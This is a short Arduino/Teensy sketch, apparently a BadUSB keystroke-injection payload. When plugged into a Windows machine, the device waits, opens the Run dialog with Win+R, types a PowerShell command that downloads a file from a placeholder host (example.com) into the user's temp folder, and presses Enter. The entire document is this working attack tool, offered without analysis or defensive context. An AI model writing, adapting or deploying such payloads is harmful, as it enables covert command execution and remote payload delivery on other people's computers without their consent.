void setup()

    {

    delay(5000);

    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);

    Keyboard.set_key1(KEY_R);

    Keyboard.send_now();

    delay(500);

    Keyboard.set_modifier(0);

    Keyboard.set_key1(0);

    Keyboard.send_now();
    

    Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('http://example.com/den.txt','%TEMP%\down.txt');");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
 
    }

    void loop()

    {

    }
